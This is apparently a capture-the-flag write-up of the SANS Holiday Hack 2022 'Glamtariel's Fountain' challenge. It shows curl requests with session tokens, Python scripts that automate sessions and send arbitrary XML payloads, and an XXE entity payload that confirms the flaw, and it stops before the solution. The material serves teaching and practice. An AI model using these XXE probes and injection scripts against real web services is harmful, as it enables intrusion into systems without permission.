# SANS Holiday Hack Challenge 2022 - KringleCon V: Golden Rings
## Recover the Web Ring
### Open Boria Mine Door
Difficulty: :christmas_tree::christmas_tree::christmas_tree::christmas_tree::christmas_tree:  
Stare into Glamtariel's fountain and see if you can find the ring! What is the filename of the ring she presents you? Talk to Hal Tandybuck in the Web Ring for hints.

#### Hints
##### eXternal Entities
*From: Hal Tandybuck*
Sometimes we can hit web pages with [XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) when they aren't expecting it!

##### Significant CASE
*From: Hal Tandybuck*
Early parts of this challenge can be solved by focusing on Glamtariel's WORDS.

#### Solution
##### Initial assessment
###### The game
The initial page contains 4 draggable images: a candy cane![candyCane](imgs/candyCane.png), a Santa![santa](imgs/santa.png), an elf![elf](imgs/elf.png) and an ice cube![iceCube](imgs/iceCube.png). There are also 2 static images: Glamtariel (aka the Princess)[![princess](imgs/princessSmall.png)](imgs/princess.png) and the Fountain[![fountain](imgs/fountainSmall.png)](imgs/fountain.png).
By dragging the first set of images in different parts of the background the Fountain and the Princess will reply with a specific message. The JS scripts behind the images also change and get reloaded with a new version followed by the timestamp (e.g. `images-1672661334202.js` where `1672661334202` is the output of `(new Date()).getTime();`). Images can be dropped on the Fountain, the Princess, both or none of them. When the whole set of images has been dropped on both the Fountain and the Princess, the draggable images change. The second set of draggable images is: a ring![ring](imgs/ring.png), a boat![boat](imgs/boat.png), an igloo![igloo](imgs/igloo.png) and a star![star](imgs/star.png). When the silver ring is dragged on top of the fountain the “ominous” eye[![ominousEye](imgs/ominousEyeSmall.png)](imgs/ominousEye.png) appears and has to be clicked away to proceed. When the whole second set of images has been dropped on both the Fountain and the Princess, a third set appears. The third set is: two blue rings![blueRing](imgs/blueRing.png), a silver ring![silverRing](imgs/silverRing.png) and a red ring![redRing](imgs/redRing.png).

###### The `\dropped` endpoint
Each time an object is dragged and dropped somewhere it fires an AJAX request toward the endpoint `/dropped`. The request payload resembles the following JSON:
```js
{
"imgDrop":"img2", // The image being dropped
"who":"princess", // Whom it is being dropped on
"reqType":"json" // "json"
}
```
Possible values of `imgDrop` are: `img1`, `img2`, `img3`, `img4`. Possible values of `who` are: `both`, `fountain`, `princess`, `none`. The `reqType` field is being programmatically set to `json` in the [`ajax.js`](https://glamtarielsfountain.com/static/js/ajax.js) file.
A CSRF token passed in the headers with the name `x-grinchum`. Cookies contain two keys named `GCLB` and `MiniLembanh`.
Below the execution of the request to `/dropped`:
```bash
thedead@dellian:~$ curl 'https://glamtarielsfountain.com/dropped' -H 'content-type: application/json' -H 'cookie: GCLB="63922974e8c3e53a"; MiniLembanh=e0bce14e-5def-4cf5-87f3-01ffc0bf7a54.vX7-q6DlZ1N25L8BqwRQB8F9qHM' -H 'x-grinchum: IjVlMzBmN2VmYWExYmJjOTczZjE2N2I1MTFiYjExODQyZjE4OTQxYWYi.Y7KxeQ.8XicSOhk_PCYaQx6gEsIvnvb4nY' --data-raw '{"imgDrop":"img2","who":"princess","reqType":"json"}'
{
  "appResp": "I've told you all I know about Kringle.^Visions come, visions go.",
  "droppedOn": "princess",
  "visit": "none"
}
```
The response is a JSON with following contents:
```js
{
  "appResp": "I've told you all I know about Kringle.^Visions come, visions go.", // The response of the princess and the fountain, in this order, separated by ^
  "droppedOn": "princess", // Whom the object was dropped on 
  "visit": "none" // Eventually populated with an URL pointing to an image that would be shown in the center of the background
}
```
###### Timeouts, MiniLembanh and `x-grinchum`
After a certain time of inactivity or when tampering with either `MiniLembanh` in the cookie or with `x-grinchum` in the header, the response changes to:
```js
{
  "appResp": "Trying to TAMPER with Kringle's favorite cookie recipe or the entrance tickets can't help you Grinchum! I'm not sure what you are looking for but it isn't here! Get out!^Miserable trickster! Please click him out of here.",
  "droppedOn": "none",
  "visit": "static/images/grinchum-supersecret_9364274.png,265px,135px"
}
```
The url [`static/images/grinchum-supersecret_9364274.png,265px,135px`](https://glamtarielsfountain.com/static/images/grinchum-supersecret_9364274.png,265px,135px) points to an image of Grinchum that appears in the middle of the page:  
![grinchum](imgs/grinchum.png)

If `MiniLembanh` or `x-grinchum` are empty the `appResp` value will be `Looks like you're missing your entrance ticket or a snack to keep healthy!^No ticket, no snack! No snack, go hungry!`.

##### Talking XML
The hints about XXE, XML and the `json` string inside the `reqType` parameter of requests to the `/dropped` endpoint led me to believe that there was probably some way to use XML in the request. I then tried to tamper with `reqType` obtaining an interesting result:
```bash
thedead@dellian:~$ curl 'https://glamtarielsfountain.com/dropped' -H 'content-type: application/json' -H 'cookie: GCLB="f33ca6b7059dae9e"; MiniLembanh=92e5692a-1ee2-4cc3-a63f-9f09b93d86d5.bVEu0CJqEUxHfrGhihz2JwwknLg' -H 'x-grinchum: ImFiMjA1ZDUxYmViZDJhYjI2ZTc0NjgwOTc5N2QzNmY1ODFhZDJmOWMi.Y7MgIw.zSuYkAmF_mB2FRHwVvQPiB5aOBI' --data-raw '{"imgDrop":"img2","who":"princess","reqType":"xml"}'
{
  "appResp": "We don't speak that way very often any more. Once in a while perhaps, but only at certain times.^I don't hear her use that very often. I think only for certain TYPEs of thoughts.",
  "droppedOn": "none",
  "visit": "none"
}
```
At that point it was a matter of writing a proper XML for the endpoint:
```bash
thedead@dellian:~$ curl -H 'Content-type: application/xml' -H 'Cookie: GCLB=f3365f91d5f67cb3; MiniLembanh=fc727d48-62d1-4cc5-b3d8-bd8048cea2ef.J1-FF9K8n_Gyln6jWit13yGBS5o' -H 'x-grinchum: ImI1NjA5MDliMDhiYmE5MmNmN2MxZTE1MWQwYjliYThlNTcwODk2ZjIi.Y7MeXg.rjUg8LjolIHtWX6Gmu2n08y9p68' -d '<?xml version="1.0" encoding="UTF-8"?><root><imgDrop>img1</imgDrop><who>princess</who><reqType>xml</reqType></root>' https://glamtarielsfountain.com/dropped
{
  "appResp": "I love rings of all colors!^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
  "droppedOn": "none",
  "visit": "none"
}
```
Below the request payload formatted for easier readability:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <imgDrop>img1</imgDrop>
    <who>princess</who>
    <reqType>xml</reqType>
</root>
```

###### Laziness & automation ;)
When trying to switch to XML before looping through all the images I was getting the following error:
```bash
thedead@dellian:~$ curl 'https://glamtarielsfountain.com/dropped' -H 'content-type: application/xml' -H 'cookie: GCLB="63922974e8c3e53a"; MiniLembanh=4c96eb1e-baaa-4337-aa5a-d2d45dbe6eb0.HXlat7cc8fBFSsMJw5Fz5BU5HdU' -H 'x-grinchum: ImFhNGI3YTk2NTAwYzlkZTI5NDg5ODZjNmZmYTA5NmNhOTQ2Y2MzOGIi.Y7NM5g.znUS44OlHNrCLjrQ5c4ggQEIqkI' --data-raw '{"imgDrop":"img2","who":"princess","reqType":"json"}'
{
  "appResp": "Zoom, Zoom, very hasty, can't do that yet!^Zoom, Zoom, very hasty, can't do that yet!",
  "droppedOn": "none",
  "visit": "none"
}
```
Also every time the session expired I was receiving the Grinchum message, resulting in the need to refresh the session. I wrote the following python script to automate the manual part:
```python
import json
import requests
import re

def getCsrf (responseText):
  regex = r"id=\"csrf\".*?content=\"(.*?)\""
  return re.search(regex, responseText).groups()[0]

def setupSession ():
  session = requests.Session()
  response = session.get('https://glamtarielsfountain.com/')
  session.headers.update({"x-grinchum": getCsrf (response.text)})
  return session

def passStuff (session, imgNum, who):
  response = session.post("https://glamtarielsfountain.com/dropped", json={"imgDrop":"img{}".format(imgNum), "who":who, "reqType":"json"})
  appResp = json.loads(response.text)["appResp"].split("^")
  princessSentence = appResp[0]
  fountainSentence = appResp[1]
  return princessSentence, fountainSentence

def passAllStuff (session):
  gotAllSentences = False
  sentences = {'princess': set(), 'fountain': set()}
  who = ["none", "both", "princess", "fountain"]
  while not gotAllSentences:  
    for droppedOn in who:
      for i in range(1, 5):
        princess, fountain = passStuff(session, i, droppedOn)
        if princess in sentences['princess'] and fountain in sentences['fountain']:
            gotAllSentences = True
        else:
          print ("ADDING SENTENCE --> IMG [{}] DROPPED ON [{}] --> PRINCESS [{}], FOUNTAIN [{}]".format(i, droppedOn, princess, fountain))
          sentences['princess'].add(princess)
          sentences['fountain'].add(fountain)
          gotAllSentences = False
  return sentences

session = setupSession()
passAllStuff(session)
for cookie in dict(session.cookies):
  print ("COOKIE --> {} = {}".format(cookie, session.cookies[cookie]))
for header in dict(session.headers):
  print ("HEADER --> {} = {}".format(header, session.headers[header]))
```
I forgot to rename it in the report and then decided to keep its orginal name also here: [`schifo.py`](schifo.py).  
The code also was a good way to obtain all sentences:
```bash
thedead@dellian:~$ python3 schifo.py 
ADDING SENTENCE --> IMG [1] DROPPED ON [none] --> PRINCESS [Some that are silver may never shine
Some who wander may get lost
All that are curious will eventually find
What others have thrown away and tossed.], FOUNTAIN [From water and cold new ice will form
Frozen spires from lakes will arise
Those shivering who weather the storm
Will learn from how the TRAFFIC FLIES.]
ADDING SENTENCE --> IMG [1] DROPPED ON [both] --> PRINCESS [Please only share with one of us.], FOUNTAIN [Please only share with one of us.]
ADDING SENTENCE --> IMG [1] DROPPED ON [princess] --> PRINCESS [Mmmmm, I love Kringlish Delight!], FOUNTAIN [I think Glamtariel is thinking of a different story.]
ADDING SENTENCE --> IMG [2] DROPPED ON [princess] --> PRINCESS [I don't know why anyone would ever ask me to TAMPER with the cookie recipe. I know just how Kringle likes them.], FOUNTAIN [Glamtariel likes to keep Kringle happy so that he and the elves will visit often.]
ADDING SENTENCE --> IMG [3] DROPPED ON [princess] --> PRINCESS [I helped the elves to create the PATH here to make sure that only those invited can find their way here.], FOUNTAIN [I wish the elves visited more often.]
ADDING SENTENCE --> IMG [4] DROPPED ON [princess] --> PRINCESS [These ice boat things would have been helpful back in the day. I still remember when Boregoth stole the Milsarils, very sad times.], FOUNTAIN [I'm glad I wasn't around for any of the early age scuffles. I shudder just thinking about the stories.]
ADDING SENTENCE --> IMG [1] DROPPED ON [fountain] --> PRINCESS [The fountain shows many things, some more helpful than others. It can definitely be a poor guide for decisions sometimes.], FOUNTAIN [What's this? Fake tickets to get in here? Snacks that don't taste right? How could that be?]
ADDING SENTENCE --> IMG [2] DROPPED ON [fountain] --> PRINCESS [Careful with the fountain! I know what you were wondering about there. It's no cause for concern. The PATH here is closed!], FOUNTAIN [Between Glamtariel and Kringle, many who have tried to find the PATH here uninvited have ended up very disAPPointed. Please click away that ominous eye!]
ADDING SENTENCE --> IMG [3] DROPPED ON [fountain] --> PRINCESS [O Frostybreath Kelthonial,
shiny stars grace the night
from heavens on high!], FOUNTAIN [Up and far many look
away from glaciers cold,
To Phenhelos they sing
here in Kringle's realm!]
ADDING SENTENCE --> IMG [4] DROPPED ON [fountain] --> PRINCESS [Did you know that I speak in many TYPEs of languages? For simplicity, I usually only communicate with this one though.], FOUNTAIN [I pretty much stick to just one TYPE of language, it's a lot easier to share things that way.]
ADDING SENTENCE --> IMG [1] DROPPED ON [princess] --> PRINCESS [It's understandable to wonder about home when one is adventuring.], FOUNTAIN [I think I'd worry too much if I ever left this place.]
ADDING SENTENCE --> IMG [2] DROPPED ON [princess] --> PRINCESS [I do have a small ring collection, including one of these.], FOUNTAIN [I think Glamtariel likes rings a little more than she lets on sometimes.]
ADDING SENTENCE --> IMG [3] DROPPED ON [princess] --> PRINCESS [I love these fancy blue rings! You can see I have two of them. Not magical or anything, just really pretty.], FOUNTAIN [If asked, Glamtariel definitely tries to insist that the blue ones are her favorites. I'm not so sure though.]
ADDING SENTENCE --> IMG [4] DROPPED ON [princess] --> PRINCESS [Ah, the fiery red ring! I'm definitely proud to have one of them in my collection.], FOUNTAIN [I think Glamtariel might like the red ring just as much as the blue ones, perhaps even a little more.]
ADDING SENTENCE --> IMG [1] DROPPED ON [fountain] --> PRINCESS [You know what one of my favorite songs is? Silver rings, silver rings ....], FOUNTAIN [Glamtariel may not have one of these silver rings in her collection, but I've overheard her talk about how much she'd like one someday.]
ADDING SENTENCE --> IMG [2] DROPPED ON [fountain] --> PRINCESS [I like to keep track of all my rings using a SIMPLE FORMAT, although I usually don't like to discuss such things.], FOUNTAIN [Glamtariel can be pretty tight lipped about some things.]
ADDING SENTENCE --> IMG [4] DROPPED ON [fountain] --> PRINCESS [Hmmm, you seem awfully interested in these rings. Are you looking for something? I know I've heard through the ice cracks that Kringle is missing a special one.], FOUNTAIN [You know, I've heard Glamtariel talk in her sleep about rings using a different TYPE of language. She may be more responsive about them if you ask differently.]
ADDING SENTENCE --> IMG [1] DROPPED ON [none] --> PRINCESS [These are kind of special, please don't drop them just anywhere.], FOUNTAIN [These are kind of special, please don't drop them just anywhere.]
ADDING SENTENCE --> IMG [4] DROPPED ON [none] --> PRINCESS [This is no small trinket, please don't drop it just anywhere.], FOUNTAIN [This is no small trinket, please don't drop it just anywhere.]
ADDING SENTENCE --> IMG [1] DROPPED ON [both] --> PRINCESS [These are kind of special, please only share with one of us.], FOUNTAIN [These are kind of special, please only share with one of us.]
ADDING SENTENCE --> IMG [4] DROPPED ON [both] --> PRINCESS [This is no small trinket, please only share it with one of us.], FOUNTAIN [This is no small trinket, please only share it with one of us.]
ADDING SENTENCE --> IMG [1] DROPPED ON [princess] --> PRINCESS [Wow!, what a beautiful silver ring! I don't have one of these. I keep a list of all my rings in my RINGLIST file. Wait a minute! Uh, promise me you won't tell anyone.], FOUNTAIN [I never heard Glamtariel mention a RINGLIST file before. If only there were a way to get a peek at that.]
COOKIE --> MiniLembanh = 379adaf1-164b-4b3a-875b-c932aa6927b1.hvm5fTi6HENhabTbnyWkpcc1piI
COOKIE --> GCLB = "3b9981a6d21a8210"
HEADER --> User-Agent = python-requests/2.21.0
HEADER --> Accept-Encoding = gzip, deflate
HEADER --> Accept = */*
HEADER --> Connection = keep-alive
HEADER --> x-grinchum = ImFiMmEwZTkyMDkyMWQ5NzBiZjg3YzhhZjU5YWM2OTQxZTE3ZDZiZDci.Y8Q3PQ.WUCPnYKrdn8On1k1plc2fP6lhzI
```

##### The XXE
Knowing it was possible to use XML and the hints about XXEs, I confirmed the presence of the issue with the payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe "img1">]>
<root>
    <imgDrop>&xxe;</imgDrop>
    <who>princess</who>
    <reqType>xml</reqType>
</root>
```
The application replied to the request as if I just dropped a ring on the princess with the message `I love rings of all colors!^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.`, therefore confirming the parser was substituting `&xxe;` with the string `img1`.

###### Random tooling
Here I wrote a quick python script called [`icsemeller.py`](icsemeller.py) that makes it easier to send XML code given a valid session:
```python
import json
import requests

def checkState (r):
  errors = ["Zoom, Zoom, very hasty, can't do that yet!", "Miserable trickster! Please click him out of here.", "No ticket, no snack! No snack, go hungry!", "no healthy upstream"]
  error = None
  for errorString in errors:
    if errorString in r.text:
      print ("GOT ERROR --> {}".format(errorString))
      error = errorString
  return error

def setupSession ():
  MiniLembanh = input ("MiniLembanh: ")
  GCLB = input("GCLB: ")
  xGrinchum = input("x-grinchum: ")
  session = requests.Session()
  session.headers.update({"x-grinchum": xGrinchum, 'Content-Type': 'application/xml'})
  session.cookies.set("MiniLembanh", MiniLembanh)
  session.cookies.set("GCLB", GCLB)
  session.headers.update({'Content-type': 'application/xml'})
  return session

def getPayload ():
  print ("Enter/Paste XML payload. Ctrl-D to end input.")
  contents = []
  while True:
    try:
      line = input("")
      contents.append(line)
    except EOFError:
      break
  payload = ' '.join(contents)
  print ("Payload is: {}".format(payload))  
  return payload

error = True
while True:
  if error:
    session = setupSession()
    r = session.post("https://glamtarielsfountain.com/dropped")
    error = checkState(r)
  else:
    payload = getPayload()
    r = session.post("https://glamtarielsfountain.com/dropped", data=payload)
    error = checkState(r)
    if not error:
      print ("Response: ")
      print (r.text)
      print ("#################################################")
```
The face of an [icsemeller](https://deepai.org/):  
![icsemeller](imgs/icsemeller.jpg)

##### Completing the challenge






---
## Recover the Web Ring
### Glamtariel's Fountain
### The Web Ring
## Recover the Cloud Ring
### AWS CLI Intro
### Trufflehog Search
### Exploitation via AWS CLI
## Recover the Burning Ring of Fire
### Buy a Hat
### Blockchain Divination
### Exploit a Smart Contract
### Mistakes were made... the key
### The Burning Ring of Fire
## [Narrative](/README.md#narrative)
## [Conclusions](/README.md#conclusions)
### [The Victors shop](/README.md#the-victors-shop)
### [Inbox (1)](/README.md#inbox-1)
---
## [thedead@dellian:~$ whoami](/README.md#thedeaddellian-whoami)
## KringleCon Orientation
## Recover the Tolkien Ring